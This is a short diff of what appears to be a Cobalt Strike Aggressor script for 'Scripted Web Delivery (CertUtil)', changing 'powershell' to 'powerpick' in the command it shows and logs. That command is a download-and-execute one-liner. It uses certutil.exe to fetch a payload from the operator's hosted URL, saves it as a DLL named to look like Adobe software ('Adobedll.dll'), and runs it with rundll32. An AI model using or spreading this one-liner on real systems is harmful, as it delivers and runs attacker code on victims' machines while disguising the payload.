@@ -27,9 +27,9 @@ sub stage_attack {
 	$url = site_host(%options["host"], %options["port"], %options["uri"], $script, "automatic", "Scripted Web Delivery (CertUtil)"); 
 
 	# tell the user our URL
-	prompt_text("Copy/Paste One-liner: ", "powershell certutil.exe -urlcache -split -f " . $url . " Adobedll.dll; rundll32.exe Adobedll.dll,StartW", {});
+	prompt_text("Copy/Paste One-liner: ", "powerpick certutil.exe -urlcache -split -f " . $url . " Adobedll.dll; rundll32.exe Adobedll.dll,StartW", {});
 	show_message("Be aware of the default values in this script and change them! (Adobedll.dll, dll.txt)");
-	elog("powershell certutil.exe -urlcache -split -f " . $url . " Adobedll.dll; rundll32.exe Adobedll.dll,StartW");
+	elog("powerpick certutil.exe -urlcache -split -f " . $url . " Adobedll.dll; rundll32.exe Adobedll.dll,StartW");
 
 }
 
